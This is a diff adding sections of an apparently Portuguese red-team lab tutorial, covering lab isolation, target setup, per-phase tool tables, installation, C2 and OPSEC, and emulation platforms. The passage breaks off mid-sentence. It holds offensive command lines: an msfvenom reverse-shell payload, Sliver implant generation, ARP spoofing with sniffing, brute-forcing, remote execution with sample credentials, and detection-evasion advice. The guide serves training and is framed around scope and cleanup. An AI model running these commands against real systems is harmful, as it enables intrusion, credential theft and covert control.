+    <pre><code><span class="c"># uma bridge isolada, sem NAT: o laboratório não chega à internet por acidente</span>
+sudo ip link add br-red type bridge
+sudo ip addr add 10.66.0.1/24 dev br-red
+sudo ip link set br-red up
+
+<span class="c"># um alvo web que pode partir</span>
+docker network create --subnet 10.66.10.0/24 redlab
+docker run -d --name juice --net redlab --ip 10.66.10.50 \
+  -p 10.66.10.50:3000:3000 bkimminich/juice-shop
+
+<span class="c"># snapshot do controlador de domínio antes de cada exercício</span>
+virsh snapshot-create-as dc01 baseline-$(date +%F) --description "AD limpo"
+
+<span class="c"># e um resolvedor que não deixa escapar as consultas reais</span>
+sudo systemd-resolve --interface br-red --set-dns 10.66.10.10</code></pre>
+    <h3>Regras que mantêm o laboratório honesto</h3>
+    <ul>
+      <li><b>Sem tráfego do laboratório para a internet.</b> Uma regra NAT e o domínio de teste aparece em registos externos.</li>
+      <li><b>Snapshot antes de cada exercício</b> e reversão no fim. Persistência no laboratório é como se aprende a limpar.</li>
+      <li><b>Escreva o registo de comandos à medida:</b> <code>script -a lab/$(date +%F).log</code> transforma uma sessão em evidência.</li>
+      <li><b>Quebre o laboratório de propósito.</b> Restaure um domínio, corrompa uma política e corrija-a — esse é o incidente que vai encontrar depois.</li>
+      <li><b>Tenha um segundo laboratório para deteções.</b> Os <a href="BlueTeams.html">defensores</a> precisam da mesma topologia com sensores ligados.</li>
+    </ul>
+  </section>
+
+  <section id="pt-walkthrough">
+    <h2><span class="no">05</span> Passo a passo: do zero ao hacking</h2>
+    <p>
+      A tabela acima é o plano; isto é a construção. Siga a ordem, porque um laboratório que falha no segundo
+      passo transforma todos os resultados seguintes em suposições. Cada comando assume um host Debian com
+      virtualização e um laboratório que não alcança a internet.
+    </p>
+
+    <h3>0. Começar do zero</h3>
+    <p>
+      Antes de um hipervisor há um portátil, um terminal e muita teoria. A ordem que funciona: Linux e a shell,
+      depois como os pacotes realmente se movem, depois uma linguagem de scripting para a ferramenta se
+      repetir, e só então este laboratório. Uma semana por etapa chega, se terminar os exercícios em vez de os
+      ler.
+    </p>
+    <ul>
+      <li><b>Linux e a shell.</b> Ficheiros, permissões, serviços, registos, e <a href="bashScripting.html">Bash</a> suficiente para percorrer uma lista de alvos sem copiar comandos à mão.</li>
+      <li><b>Redes.</b> <a href="tcpudp.html">Pacotes</a> TCP e UDP, <a href="dnsProtocol.html">DNS</a>, <a href="httpProtocol.html">HTTP</a>, e o resto do manual de <a href="networking.html">redes</a>.</li>
+      <li><b>Programação.</b> <a href="pythonCert.html">Python</a> para interpretar saída de scanners e chamar APIs, <a href="curlManual.html">curl</a> para o pedido em bruto, e o hábito <a href="python-cli.html">cli</a> de construir uma ferramenta pequena por cada tarefa repetitiva.</li>
+      <li><b>Contentores.</b> O manual de <a href="docker.html">Docker</a>, porque metade dos alvos deste laboratório estão a um contentor de distância.</li>
+    </ul>
+
+    <h3>1. Host e hipervisor</h3>
+    <pre><code>sudo apt install -y qemu-kvm libvirt-daemon-system virtinst libosinfo-bin
+sudo usermod -aG libvirt,kvm "$USER"   <span class="c"># sair e entrar de novo</span>
+virt-host-validate                     <span class="c"># as respostas de KVM têm de estar OK</span></code></pre>
+
+    <h3>2. Duas redes isoladas, sem NAT</h3>
+    <pre><code>cat &gt; /tmp/red-attack.xml &lt;&lt;'XML'
+&lt;network&gt;
+  &lt;name&gt;red-attack&lt;/name&gt;
+  &lt;bridge name="virbr-reda"/&gt;
+  &lt;ip address="10.66.0.1" netmask="255.255.255.0"&gt;
+    &lt;dhcp&gt;&lt;range start="10.66.0.100" end="10.66.0.150"/&gt;&lt;/dhcp&gt;
+  &lt;/ip&gt;
+&lt;/network&gt;
+XML
+virsh net-define /tmp/red-attack.xml
+virsh net-start red-attack &amp;&amp; virsh net-autostart red-attack
+virsh net-list --all</code></pre>
+    <p>
+      Repita para <code>red-target</code> em <code>10.66.10.0/24</code>. Não existe, de propósito, elemento
+      <code>&lt;forward&gt;</code>: sem rota para fora não há tráfego acidental para o exterior.
+    </p>
+
+    <h3>3. O atacante</h3>
+    <pre><code>virt-install --name kali --memory 4096 --vcpus 2 --disk size=40 \
+  --cdrom ~/isos/kali-linux-installer-amd64.iso --network network=red-attack
+
+<span class="c"># dentro do Kali, após o primeiro arranque</span>
+sudo apt update &amp;&amp; sudo apt install -y kali-tools-top10 kali-tools-web
+sudo apt install -y seclists feroxbuster bloodhound.py
+ip -br addr    <span class="c"># tem de ser 10.66.0.x, sem rota predefinida para a internet</span></code></pre>
+
+    <h3>4. Alvos e um domínio</h3>
+    <pre><code><span class="c"># um alvo web, segundo o guia de contentores deste blogue</span>
+docker run -d --name dvwa --net target --ip 10.66.10.50 -p 80:80 vulnerables/web-dvwa
+docker run -d --name juice --net target --ip 10.66.10.51 -p 3000:3000 bkimminich/juice-shop
+
+<span class="c"># um host Linux para pivotar, e um parque Windows para AD</span>
+virt-install --name metasploitable --memory 2048 --disk size=20 \
+  --import ~/isos/metasploitable.qcow2 --network network=red-target
+
+<span class="c"># laboratório AD: um DC, dois clientes, política deliberadamente fraca (GOAD ou BadBlood)</span>
+git clone https://github.com/Orange-Cyberdefense/GOAD
+cd GOAD &amp;&amp; ./goad.sh -t install -l GOAD -p virtualbox</code></pre>
+
+    <h3>5. Snapshot e prova de isolamento</h3>
+    <pre><code>for d in dc01 ws01 kali; do virsh snapshot-create-as $d clean --description "pre-drill"; done
+ping -c1 10.66.10.10 &amp;&amp; ping -c1 -W1 1.1.1.1   <span class="c"># o segundo ping tem de falhar</span>
+sudo tcpdump -i virbr-redt -nn -c5   <span class="c"># aparecem tramas, e nada sai</span></code></pre>
+
+    <h3>6. Escrever as suas próprias ferramentas</h3>
+    <p>
+      Uma red team que escreve todos os comandos à mão esquece-se do que correu. Dois scripts pequenos
+      substituem o copiar-colar: um percorre a lista de alvos e guarda evidência, o outro transforma o XML do
+      scanner na tabela que o relatório precisa. Ambos são curtos e ambos são exercícios dos manuais de
+      <a href="bashScripting.html">Bash</a> e <a href="pythonCert.html">Python</a>.
+    </p>
+    <pre><code><span class="c"># sweep.sh — um ciclo, um diretório de evidência, nenhuma saída perdida</span>
+#!/usr/bin/env bash
+set -euo pipefail
+mkdir -p ev
+while read -r host; do
+  nmap -sV -Pn -oA "ev/$(echo "$host" | tr . _)" "$host"
+done &lt; alvos.txt
+sha256sum ev/*.xml &gt; ev/SHA256SUMS</code></pre>
+    <pre><code><span class="c"># ports.py — a tabela de portas abertas, diretamente do XML</span>
+#!/usr/bin/env python3
+import glob, xml.etree.ElementTree as ET
+
+for path in sorted(glob.glob("ev/*.xml")):
+    for host in ET.parse(path).iter("host"):
+        addr = host.find("address").get("addr")
+        for port in host.iter("port"):
+            if port.find("state").get("state") == "open":
+                name = port.find("service").get("name", "?")
+                print(addr, port.get("portid"), name)</code></pre>
+    <pre><code>chmod +x sweep.sh &amp;&amp; ./sweep.sh &amp;&amp; python3 ports.py &gt; ev/open-ports.txt
+column -t ev/open-ports.txt</code></pre>
+
+    <h3>7. Exercícios: uma pergunta, uma ferramenta, um artefacto</h3>
+    <p>
+      Cada linha é um teste completo: a pergunta, o comando do manual <a href="KaliLinux.html">Kali</a> e o
+      que conta como aprovação. Guarde cada comando com a saída — o lado dos sensores lê o mesmo tráfego, e
+      os <a href="BlueTeams.html">defensores</a> precisam das duas metades.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Pergunta</th><th>Comando</th><th>Aprovação</th></tr></thead>
+        <tbody>
+          <tr><td>Que hosts estão vivos?</td><td><code>nmap -sn 10.66.10.0/24</code></td><td>Três a cinco hosts, todos dentro do intervalo alvo</td></tr>
+          <tr><td>Que portas TCP estão abertas?</td><td><code>nmap -sS -p- --min-rate 1000 -oA ev/tcp 10.66.10.50</code></td><td>Uma lista curta de portas, guardada e com hora</td></tr>
+          <tr><td>Que serviços e versões?</td><td><code>nmap -sCV -p 22,80,3000 --script safe -oA ev/svc 10.66.10.50</code></td><td>Banners de versão comparáveis com um CVE</td></tr>
+          <tr><td>Qual é a pilha web?</td><td><code>whatweb -a 3 http://10.66.10.51:3000</code></td><td>Framework, servidor e pistas de cabeçalhos</td></tr>
+          <tr><td>O que está escondido?</td><td><code>feroxbuster -u http://10.66.10.50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20</code></td><td>Uma lista de caminhos, cada um verificado à mão</td></tr>
+          <tr><td>A injeção é real?</td><td><code>sqlmap -u "http://10.66.10.51:3000/rest/products/search?q=1" --level 2 --risk 1 --batch --dbs</code></td><td>Um nome de base de dados, apenas leitura, sem extrair dados</td></tr>
+          <tr><td>O hash é fraco?</td><td><code>hashcat -m 22000 ev/capture.hc22000 /usr/share/wordlists/rockyou.txt</code></td><td>Uma chave recuperada, offline, com tempo registado</td></tr>
+          <tr><td>Até onde chega uma identidade?</td><td><code>bloodhound-python -u bob -p 'Passw0rd!' -d lab.local -ns 10.66.10.10 -c DCOnly --zip</code></td><td>Um grafo cujo caminho mais curto termina em Domain Admin</td></tr>
+          <tr><td>Onde funciona uma credencial?</td><td><code>nxc smb 10.66.10.0/24 -u bob -p 'Passw0rd!' -d LAB --shares</code></td><td>Lista de hosts com Pwn3d! apenas onde é verdade</td></tr>
+          <tr><td>Consigo operar no host?</td><td><code>impacket-wmiexec LAB/bob:'Passw0rd!'@10.66.10.20 whoami</code></td><td>Um comando, e depois para</td></tr>
+          <tr><td>O canal sobrevive às regras?</td><td><code>sliver</code> → <code>mtls --lhost 10.66.0.50 --lport 8888</code> → <code>generate --mtls 10.66.0.50:8888 --os windows</code></td><td>Uma sessão, e uma linha no sensor</td></tr>
+          <tr><td>O MITM é visível?</td><td><code>bettercap -iface eth0</code> → <code>net.probe on</code> → <code>arp.spoof on</code></td><td>Respostas ARP duplicadas no <a href="tcpdump.html">tcpdump</a>, vistas também pelo sensor</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>8. Mudar de arena: um exercício por domínio</h3>
+    <p>
+      Um laboratório não é uma competência. O mesmo par de hosts pode alojar sete trabalhos diferentes, e cada
+      um precisa do seu alvo, da sua ferramenta e da sua prova. Acrescente uma linha por sprint em vez de
+      todas de uma vez — a lista de capítulos do manual <a href="KaliLinux.html">Kali</a> já separa as
+      ferramentas assim.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Domínio</th><th>O que acrescentar ao laboratório</th><th>Ferramenta do manual</th><th>Prova a guardar</th></tr></thead>
+        <tbody>
+          <tr><td>Sistema (Linux)</td><td>Um convidado Debian com sudo mal configurado e um cron gravável por todos</td><td><code>sudo -l</code>, PEASS-ng</td><td>A linha da má configuração e a transcrição da shell de root</td></tr>
+          <tr><td>Sistema (Windows)</td><td>Caminho de serviço sem aspas, ACL fraca, uma partilha SMB antiga</td><td>WinPEAS, <code>sc qc</code>, NetExec</td><td>Estado do serviço antes e depois, restaurado</td></tr>
+          <tr><td>Web</td><td>DVWA mais uma API sua, atrás do mesmo proxy</td><td>sqlmap, ffuf, whatweb</td><td>Um pedido e resposta mínimos, sem extrair dados</td></tr>
+          <tr><td>CMS</td><td>Um contentor WordPress, seguindo as notas de <a href="wordpress_attacks.html">WordPress</a> deste blogue</td><td>WPScan, nuclei</td><td>Versão do plugin e aviso, nunca uma desfiguração</td></tr>
+          <tr><td>Rede</td><td>Dois convidados mais o sensor, um caminho encaminhado entre eles</td><td>bettercap, Responder, tcpdump</td><td>ARP duplicado, e a tabela ARP restaurada no fim</td></tr>
+          <tr><td>Sem fios</td><td>Um ponto de acesso seu, WPA2, num canal que ninguém usa</td><td>airmon-ng, airodump-ng, hcxtools, hashcat</td><td>O ficheiro hc22000 e a chave recuperada; nada de deauth fora dali</td></tr>
+          <tr><td>Active Directory</td><td>GOAD com um utilizador Kerberoastable, uma conta sem pré-autenticação e SMB sem assinatura</td><td>impacket-GetUserSPNs, nxc, ntlmrelayx</td><td>Uma referência ao bilhete, nunca o bilhete em si</td></tr>
+          <tr><td>Cloud e código</td><td>Um tenant seu, ou um contentor com uma API exposta</td><td>curl, a CLI do fornecedor</td><td>Apenas a listagem — acesso de leitura prova o ponto</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      A linha web é a que pode começar hoje: <a href="phpLovers.html">PHP</a>,
+      <a href="dontBeLazy.html">aplicações</a> e <a href="httpProtocol.html">HTTP</a> explicam o que um pedido
+      realmente faz antes de o fuzzar, que é a diferença entre um achado e uma captura de ecrã.
+    </p>
+
+    <h3>9. Evidência, limpeza e reposição</h3>
+    <pre><code>script -a ev/sessao-$(date +%F).log          <span class="c"># transcrição desde o primeiro comando</span>
+sha256sum ev/* &gt; ev/SHA256SUMS               <span class="c"># hash do que fica guardado</span>
+sudo sliver-server   <span class="c"># depois: sessions, kill &lt;id&gt;, e apagar o implante do laboratório</span>
+for d in dc01 ws01 kali; do virsh snapshot-revert $d clean; done</code></pre>
+    <div class="callout">
+      <h4>O exercício acaba quando o laboratório está limpo</h4>
+      <p>
+        Reverta os snapshots, mate as sessões, remova ficheiros carregados e confirme que a tabela ARP voltou
+        ao normal. Um laboratório que guarda o implante de ontem ensina a deixar persistência num cliente — o
+        achado mais comum numa red team em reteste.
+      </p>
+    </div>
+  </section>
+
+  <section id="pt-tools">
+    <h2><span class="no">06</span> Mapa de ferramentas por fase</h2>
+    <p>
+      As ferramentas estão agrupadas pela pergunta a que respondem, não pelo menu onde aparecem no Kali. Se
+      duas ferramentas partilham a mesma linha, a nota explica quando cada uma ganha.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Fase</th><th>Ferramenta</th><th>O que prova</th></tr></thead>
+        <tbody>
+          <tr><td>Reconhecimento</td><td>nmap, amass, theHarvester</td><td>Que hosts e nomes existem, e quais são alcançáveis a partir de onde</td></tr>
+          <tr><td>Reconhecimento</td><td>BloodHound e coletores</td><td>O grafo de identidades e o caminho mais curto até ao objetivo</td></tr>
+          <tr><td>Acesso inicial</td><td>GoPhish, evilginx</td><td>Se um engodo realista e um proxy inverso derrotam o MFA</td></tr>
+          <tr><td>Acesso inicial</td><td>Impacket, NetExec</td><td>Se serviços expostos aceitam credenciais que já possui</td></tr>
+          <tr><td>Execução</td><td>Sliver, Mythic, Havoc, Cobalt Strike</td><td>Comando e controlo por um canal realista e com registos</td></tr>
+          <tr><td>Persistência</td><td>LOLBins, tarefas agendadas, unidades systemd</td><td>Se o ponto de apoio sobrevive ao arranque e à revisão</td></tr>
+          <tr><td>Privilégios</td><td>PEASS-ng, Seatbelt, Rubeus</td><td>Que má configuração transforma um utilizador em administrador</td></tr>
+          <tr><td>Credenciais</td><td>Mimikatz, secretsdump, Kerberoast</td><td>Se o património de credenciais é mais forte que o perímetro</td></tr>
+          <tr><td>Movimento lateral</td><td>NetExec, wmiexec, chisel, ligolo-ng</td><td>Até onde chega uma identidade e através de que artefacto</td></tr>
+          <tr><td>Recolha</td><td>Enumeração de partilhas e clientes de base de dados</td><td>Se os dados do objetivo são alcançáveis, não quantos existem</td></tr>
+          <tr><td>Exfiltração</td><td>rclone, canais DNS/HTTPS</td><td>Se o controlo de saída funciona — com uma amostra mínima e com hash</td></tr>
+          <tr><td>Impacto</td><td>Demonstrações documentadas e reversíveis</td><td>Consequência de negócio, sem a causar</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="callout note">
+      <h4>Parar na prova</h4>
+      <p>
+        Uma red team que copia a base de dados do cliente produziu uma violação de dados, não um achado.
+        Recolha o menor artefacto que demonstra o acesso, calcule o hash, cifre-o e explique no relatório o
+        que <em>não</em> tocou. A mesma regra vale para a persistência: remova-a e registe a remoção.
+      </p>
+    </div>
+    <p>
+      O detalhe ferramenta a ferramenta está no manual do <a href="KaliLinux.html">Kali</a>, e a metade da
+      exploração especificamente no <a href="metasploit.html">Metasploit</a>.
+    </p>
+  </section>
+
+  <section id="pt-setup">
+    <h2><span class="no">07</span> Instalação: cada ferramenta desta página</h2>
+    <p>
+      Os nomes de pacotes abaixo são de Kali rolling e Debian. A regra que poupa horas: <b>apt primeiro</b>
+      (empacotado, atualizado com o sistema), <b>pipx em segundo</b> (um ambiente virtual por ferramenta
+      Python), <b>releases em terceiro</b> (um arquivo fixo que pode calcular em hash). Nunca misture um
+      repositório de terceiros num sistema rolling por causa de uma ferramenta, e nunca canalize um instalador
+      remoto para uma shell de root.
+    </p>
+
+    <h3>A caixa do atacante numa passagem</h3>
+    <pre><code>sudo apt update
+sudo apt install -y nmap masscan arp-scan amass theharvester \
+  ffuf feroxbuster gobuster whatweb nikto sqlmap wpscan nuclei \
+  hydra hashcat john cewl crunch responder bettercap ettercap-text-only \
+  tcpdump tshark mitmproxy aircrack-ng hcxtools kismet \
+  metasploit-framework exploitdb python3-impacket netexec evil-winrm \
+  bloodhound neo4j sliver docker.io git golang-go
+
+<span class="c"># um ambiente virtual por ferramenta Python, sem pip global</span>
+pipx install bloodhound      <span class="c"># coletor BloodHound.py</span>
+pipx install impacket        <span class="c"># se quiser scripts mais recentes que os do apt</span>
+
+<span class="c"># cada binário responde, ou corrige agora e não a meio do trabalho</span>
+for t in nmap masscan ffuf feroxbuster sqlmap hydra hashcat responder \
+         bettercap tcpdump tshark mitmproxy aircrack-ng hcxtools msfconsole nxc; do
+  printf '%-14s %s\n' "$t" "$(command -v "$t" || echo MISSING)"
+done</code></pre>
+
+    <h3>O que cada ferramenta precisa antes de funcionar</h3>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Ferramenta</th><th>Instalação</th><th>Primeiro arranque</th></tr></thead>
+        <tbody>
+          <tr><td>nmap</td><td><code>apt install nmap</code></td><td>Nada; atualizar os scripts NSE com <code>nmap --script-updatedb</code></td></tr>
+          <tr><td>masscan</td><td><code>apt install masscan</code></td><td>Exige um <code>--rate</code> que consiga justificar e um IP de origem seu</td></tr>
+          <tr><td>amass</td><td><code>apt install amass</code></td><td><code>amass enum -passive -d exemplo.org</code>; chaves de API opcionais em <code>~/.config/amass/</code></td></tr>
+          <tr><td>theHarvester</td><td><code>apt install theharvester</code></td><td>Funciona com fontes públicas; chaves em <code>api-keys.yaml</code> dão profundidade</td></tr>
+          <tr><td>ffuf, feroxbuster, gobuster</td><td><code>apt install ffuf feroxbuster gobuster</code></td><td>Instalar wordlists: <code>apt install seclists</code>, em <code>/usr/share/seclists/</code></td></tr>
+          <tr><td>whatweb, nikto, wpscan, nuclei</td><td><code>apt install whatweb nikto wpscan nuclei</code></td><td><code>nuclei -update-templates</code>; o WPScan quer um token de API gratuito</td></tr>
+          <tr><td>sqlmap</td><td><code>apt install sqlmap</code></td><td>Começar em <code>--level 2 --risk 1</code>; ler o ponto de injeção antes de automatizar</td></tr>
+          <tr><td>hydra</td><td><code>apt install hydra</code></td><td>Ver a política de bloqueio primeiro; <code>-t 4</code> é um teto seguro em produção</td></tr>
+          <tr><td>hashcat, john</td><td><code>apt install hashcat john</code></td><td><code>hashcat -I</code> para listar dispositivos; descompactar o <code>rockyou.txt.gz</code></td></tr>
+          <tr><td>cewl, crunch</td><td><code>apt install cewl crunch</code></td><td>Gerar e depois ordenar por probabilidade; uma lista enorme esconde o bom candidato</td></tr>
+          <tr><td>Responder</td><td><code>apt install responder</code></td><td>Primeiro <code>responder -I eth0 -A</code> (analisar), depois envenenar apenas em âmbito</td></tr>
+          <tr><td>bettercap, ettercap</td><td><code>apt install bettercap ettercap-text-only</code></td><td><code>sudo sysctl -w net.ipv4.ip_forward=1</code>; restaurar no fim</td></tr>
+          <tr><td>tcpdump, tshark, mitmproxy</td><td><code>apt install tcpdump tshark mitmproxy</code></td><td>O tshark precisa do grupo <code>wireshark</code> ou de root; o CA do mitmproxy tem de ser confiado pelo cliente</td></tr>
+          <tr><td>aircrack-ng, hcxtools, kismet</td><td><code>apt install aircrack-ng hcxtools kismet</code></td><td>Adaptador com monitor mode; <code>airmon-ng check kill</code> antes de <code>airmon-ng start wlan0</code></td></tr>
+          <tr><td>Metasploit, searchsploit</td><td><code>apt install metasploit-framework exploitdb</code></td><td><code>sudo msfdb init</code> uma vez; <code>searchsploit -u</code> para atualizar o arquivo</td></tr>
+          <tr><td>Impacket, NetExec, Evil-WinRM</td><td><code>apt install python3-impacket netexec evil-winrm</code></td><td>Os scripts do Impacket têm prefixo <code>impacket-</code>; <code>nxc</code> é o binário do NetExec</td></tr>
+          <tr><td>BloodHound</td><td><code>apt install bloodhound neo4j</code></td><td><code>sudo neo4j console</code>, mudar a password predefinida, depois <code>bloodhound</code>; recolher com <code>pipx install bloodhound</code> → <code>bloodhound-python</code></td></tr>
+          <tr><td>Sliver</td><td><code>apt install sliver</code></td><td><code>sliver-server</code> e depois <code>mtls --lhost 10.66.0.50 --lport 8888</code>; só no laboratório</td></tr>
+          <tr><td>Mythic, Havoc</td><td>Releases do GitHub, Docker</td><td>Mythic: <code>./install_docker.sh &amp;&amp; ./mythic-cli start</code></td></tr>
+          <tr><td>GoPhish, evilginx</td><td>Releases do GitHub / <code>go build</code></td><td>O GoPhish serve administração na 3333 e a isca na 80/443; use um domínio seu</td></tr>
+          <tr><td>PEASS-ng, Seatbelt, Rubeus, Mimikatz</td><td>Releases do GitHub</td><td>Correr apenas no host do laboratório; calcular hash do que se descarrega e guardar a versão</td></tr>
+          <tr><td>Atomic Red Team, Caldera, GOAD</td><td>git clone</td><td>Atomic: <code>Invoke-AtomicTest T1059.001 -CheckPrereqs</code>; Caldera: <code>python server.py --insecure</code>; GOAD: <code>./goad.sh -t install</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Como usar, por finalidade</h3>
+    <p>
+      Um comando por finalidade, na ordem em que um trabalho os encontra. Cada linha é a forma mínima que ainda
+      produz evidência; o fluxo completo está no manual <a href="KaliLinux.html">Kali</a> e, na metade da
+      exploração, no manual do <a href="metasploit.html">Metasploit</a> deste blogue.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Finalidade</th><th>Comando</th><th>O que obtém</th></tr></thead>
+        <tbody>
+          <tr><td>Encontrar hosts vivos</td><td><code>nmap -sn 10.66.10.0/24 -oA ev/disc</code></td><td>Uma lista de hosts, guardada e com hora</td></tr>
+          <tr><td>Identificar serviços</td><td><code>nmap -sCV -p- --min-rate 1000 -oA ev/svc 10.66.10.50</code></td><td>Versões comparáveis com um aviso</td></tr>
+          <tr><td>Encontrar conteúdo</td><td><code>feroxbuster -u http://10.66.10.50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 20 -o ev/dirs.txt</code></td><td>Caminhos, cada um verificado à mão</td></tr>
+          <tr><td>Fuzz a um parâmetro</td><td><code>ffuf -u 'http://10.66.10.50/item?q=FUZZ' -w params.txt -mc 200</code></td><td>Diferenças de resposta que merecem olhar</td></tr>
+          <tr><td>Provar injeção</td><td><code>sqlmap -r req.txt --level 2 --risk 1 --batch --dbs</code></td><td>Nomes de bases de dados, apenas leitura</td></tr>
+          <tr><td>Identificar um CMS</td><td><code>whatweb -a 3 http://10.66.10.50</code> e <code>wpscan --url http://10.66.10.50 --enumerate vp</code></td><td>Versões da plataforma e dos plugins</td></tr>
+          <tr><td>Testar credenciais online</td><td><code>hydra -L users.txt -P pass.txt -t 4 -f ssh://10.66.10.20</code></td><td>Um par válido, e depois parar</td></tr>
+          <tr><td>Quebrar offline</td><td><code>hashcat -m 22000 ev/cap.hc22000 /usr/share/wordlists/rockyou.txt</code></td><td>A chave, ou uma chave bem defendida</td></tr>
+          <tr><td>Mapear AD</td><td><code>bloodhound-python -c DCOnly --zip</code>, depois <code>sudo neo4j console</code> e <code>bloodhound</code></td><td>O caminho mais curto até ao objetivo</td></tr>
+          <tr><td>Validar acesso</td><td><code>nxc smb 10.66.10.0/24 -u bob -p 'Passw0rd!' -d LAB --shares --sessions</code></td><td>Onde aquela identidade realmente funciona</td></tr>
+          <tr><td>Executar um comando</td><td><code>impacket-wmiexec LAB/bob:'Passw0rd!'@10.66.10.20 whoami</code></td><td>Prova de execução, nada mais</td></tr>
+          <tr><td>Explorar</td><td><code>msfconsole -q</code> → <code>search</code> → <code>use</code> → <code>set RHOSTS</code> → <code>check</code> → <code>run</code></td><td>Uma sessão, depois de <code>check</code> dizer que é seguro</td></tr>
+          <tr><td>Construir um payload</td><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.66.0.50 LPORT=4444 -f exe -o ev/imp.exe</code></td><td>Um payload e o handler correspondente</td></tr>
+          <tr><td>Manter um canal</td><td><code>sliver-server</code> → <code>mtls --lhost 10.66.0.50 --lport 8888</code> → <code>generate --mtls 10.66.0.50:8888 --os windows</code></td><td>Uma sessão e um registo no servidor</td></tr>
+          <tr><td>Capturar tráfego</td><td><code>tcpdump -i eth0 -nn -s0 -w ev/cap.pcap 'tcp port 80'</code> e <code>tshark -r ev/cap.pcap -Y http.request</code></td><td>Evidência que pode ser repetida depois</td></tr>
+          <tr><td>Intercetar uma sessão</td><td><code>bettercap -iface eth0</code> → <code>net.probe on</code> → <code>arp.spoof on</code> → <code>net.sniff on</code></td><td>Credenciais em claro, e uma rede a restaurar</td></tr>
+          <tr><td>Testar sem fios</td><td><code>airmon-ng start wlan0</code> → <code>airodump-ng -w ev/cap wlan0mon</code> → <code>hcxpcapngtool -o ev/cap.hc22000 ev/cap.pcapng</code></td><td>Um ficheiro de handshake, pronto para o hashcat</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p>
+      O Metasploit merece um parágrafo próprio porque é um fluxo de trabalho, não um comando: iniciar a base de
+      dados, procurar por tipo de módulo e plataforma, correr sempre <code>check</code> antes de
+      <code>run</code> e manter a lista de sessões. O <a href="metasploit.html">manual</a> cobre a base de
+      dados, a anatomia dos módulos, a escolha de payload e as sessões em detalhe; o bloco abaixo é apenas a
+      forma de uma primeira passagem segura.
+    </p>
+    <pre><code>sudo msfdb init &amp;&amp; msfconsole -q
+msf6 &gt; db_status
+msf6 &gt; search type:auxiliary name:smb
+msf6 &gt; use auxiliary/scanner/smb/smb_version
+msf6 &gt; set RHOSTS 10.66.10.0/24
+msf6 &gt; run
+msf6 &gt; use exploit/... &amp;&amp; set RHOSTS 10.66.10.20
+msf6 &gt; check          <span class="c"># vulnerável? então, e só então:</span>
+msf6 &gt; run
+msf6 &gt; sessions -l &amp;&amp; sessions -k 1</code></pre>
+
+    <div class="callout">
+      <h4>Três destas não se instalam</h4>
+      <p>
+        Cobalt Strike, Brute Ratel e Burp Suite Pro são produtos licenciados: compra-se um posto, não se faz
+        <code>apt install</code>, e a licença normalmente proíbe partilhar o artefacto. Todo o resto desta
+        página é open source ou já está empacotado — é por isso que um laboratório se reconstrói com um script
+        e uma ferramenta paga não.
+      </p>
+    </div>
+    <p>
+      Antes de isto chegar a um alvo, releia o âmbito. O manual <a href="KaliLinux.html">Kali</a> tem a base
+      legal, e <a href="EthicalLawsOnIT.html">Ética</a> explica porque a instalação é a parte fácil.
+    </p>
+  </section>
+
+  <section id="pt-infra">
+    <h2><span class="no">08</span> C2, redirecionadores e OPSEC</h2>
+    <p>
+      A infraestrutura é onde os trabalhos amadores são detetados primeiro — antes de qualquer payload
+      correr. O padrão que funciona é aborrecido: um servidor de equipa estável, alcançável apenas pelos
+      operadores, um ou mais redirecionadores entre ele e o alvo, domínios de vida curta registados num
+      registador real e perfis parecidos com o tráfego à volta.
+    </p>
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Decisão</th><th>Escolha conservadora</th><th>Compromisso</th></tr></thead>
+        <tbody>
+          <tr><td>Canal</td><td>HTTPS com domínio atrás de uma CDN sua</td><td>Mais lento, mas mistura-se com a saída normal</td></tr>
+          <tr><td>Beacon</td><td>Sleep longo, jitter acima de 30%, sem shell interativa sem necessidade</td><td>Paciência por segurança</td></tr>
+          <tr><td>Redirecionador</td><td>Host separado, lista de IPs permitidos para o servidor de equipa</td><td>Mais uma peça para reconstruir a meio</td></tr>
+          <tr><td>Domínios</td><td>Envelhecidos, categorizados, com SPF/DKIM/DMARC</td><td>Custo e tempo antes da janela abrir</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <h3>OPSEC é uma lista, não uma intuição</h3>
+    <ul>
+      <li><b>Identidades separadas.</b> Conta de operador, perfil de navegador e VM dedicados por trabalho, nunca os seus logins pessoais.</li>
+      <li><b>Assuma telemetria.</b> Cada comando pode ficar em EDR, DNS ou proxy. Desenhe o payload para provar o ponto, não para evitar todos os registos.</li>
+      <li><b>Atividade com horário.</b> Horário laboral no fuso do alvo; uma shell fora de horas é, por si, uma deteção.</li>
+      <li><b>Destrua a sua própria infraestrutura</b> no fim e guarde os registos. O <code>journalctl</code> do servidor de equipa também é evidência.</li>
+      <li><b>Não reutilize ferramentas entre clientes.</b> Um hash de malware num sandbox público liga trabalhos que prometeu separar.</li>
+    </ul>
+  </section>
+
+  <section id="pt-emulation">
+    <h2><span class="no">09</span> Plataformas de emulação</h2>
+    <p>
+      Com o laboratório montado, a automatização transforma testes avulsos em dados de cobertura. Os testes
+      atómicos exercitam uma técnica depressa; o Caldera encadeia habilidades numa operação; o VECTR
+      registra o que foi executado e se foi detetado.
+    </p>
+    <pre><code><span class="c"># correr uma técnica e ver o que o endpoint deve registar</span>
+git clone https://github.com/redcanaryco/atomic-red-team
+pwsh -c "Import-Module ./atomic-red-team/atomics/Invoke-AtomicRedTeam.psd1; \
+  Invoke-AtomicTest T1059.001 -TestNumbers 1 -CheckPrereqs"
+
+<span class="c"># um agente Caldera, só dentro do laboratório</span>
+caldera --insecure --build
+
+<span class="c"># registar o plano antes de executar</span>
+echo "ator,tecnica,telemetria esperada,detetado(s/n)" &gt; lab/emulacao.csv</code></pre>
+    <p>
+      O entregável útil da emulação é uma matriz, não uma shell: técnica, artefacto esperado, se apareceu e
